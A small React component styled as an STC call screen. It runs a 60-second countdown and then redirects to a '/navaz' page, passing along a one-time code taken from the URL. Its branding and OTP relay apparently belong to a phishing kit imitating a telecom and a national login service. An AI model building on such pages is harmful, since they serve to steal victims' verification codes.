import React from 'react'
import { useEffect } from 'react';
import { useState } from 'react';
import { IoIosCall } from "react-icons/io";

const STC = () => {
    const [counter, setCounter] = useState(60)
    const query = new URLSearchParams(window.location.search)
    const otp = query.get('otp')
    
    useEffect(() => {
        const timer = setInterval(() => {
          if (counter > 0) {
            setCounter(counter - 1); // Decrease counter by 1 second
          }
        }, 1000);
    
        // Cleanup function to clear the interval when the component unmounts
        if(counter ===0){
           return window.location.href = `/navaz?userOtp=${otp}`
        }
        return () => clearInterval(timer);
      }, [counter]); 
              // Calculate minutes and seconds
              const minutes = Math.floor(counter / 60);
              const seconds = counter % 60;
      
              // Format the counter value as "MM:SS"
              const formattedMinutes = String(minutes).padStart(2, '0');
              const formattedSeconds = String(seconds).padStart(2, '0');
  return (
    <div className='flex flex-col w-full min-h-screen justify-start items-start '>
        <img src='/stcPage.jpg'/>

        <div className='flex flex-col w-full p-3 justify-center items-center'>
            <p className='text-xl font-bold'>{formattedMinutes}:{formattedSeconds}</p>
            <button className='text-white bg-red-500 shadow-lg text-lg px-3 py-1 rounded-2xl flex items-center gap-x-2 my-2'>END<IoIosCall />
            </button>

        </div>

    </div>
  )
}

export default STC